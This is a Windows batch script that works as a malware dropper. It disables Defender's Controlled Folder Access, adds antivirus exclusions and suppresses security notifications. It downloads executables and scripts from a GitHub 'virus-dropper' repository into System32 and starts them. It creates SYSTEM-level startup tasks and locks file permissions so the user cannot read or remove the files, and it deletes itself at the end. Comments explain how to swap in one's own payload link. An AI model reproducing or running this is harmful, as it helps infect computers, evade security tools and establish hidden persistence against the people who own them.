del /f "%appdata%\Windows\Install.bat"
cls
rd %appdata%\Windows
cls
powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
cls
color ef
cls
::disables ControlledFolderAccess to access files and folders
cls
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
cls
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
cls
start /min AV.bat
cls
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
cls
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows3.exe" --output "%appdata%\Windows3.exe"
cls
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
cls
::windows defender exclusions
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows3.exe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"winmanager.exe'"
cls
md "%systemroot%\System32\Windowsexe"
cls

::upload files here: github.com - create account and create repository (public) then upload files
::put payload file DIRECT download link here:
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
cls


move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
cls

::update file here
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
cls
move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
cls
::do not change the --output


powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Winmanager'"
cls
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
cls
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
cls
move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
cls
move "%appdata%\Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
cls
copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
cls
start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
cls
start "Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
cls
powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
cls
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL LIMITED
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
cls
del /f rickroll.*
del /f NSudo.exe
cls
powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
timeout /t 5 /nobreak
icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Windows3.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Update.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
cls
icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windows Manager\winmanager.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
cls
icacls "%systemroot%\System32\Windowsexe\AV.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Update.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
cls
icacls "%systemroot%\System32\Windowsexe\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
cls
icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
cls
icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
cls
icacls "%systemroot%\System32\Windowsexe\AV.bat" /deny everyone:R "%username%":R
cls
icacls "%systemroot%\System32\Windowsexe\Update.bat" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Windows.exe" /deny everyone:R "%username%":R
cls
cls
icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /deny everyone:R "%username%":R
cls
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
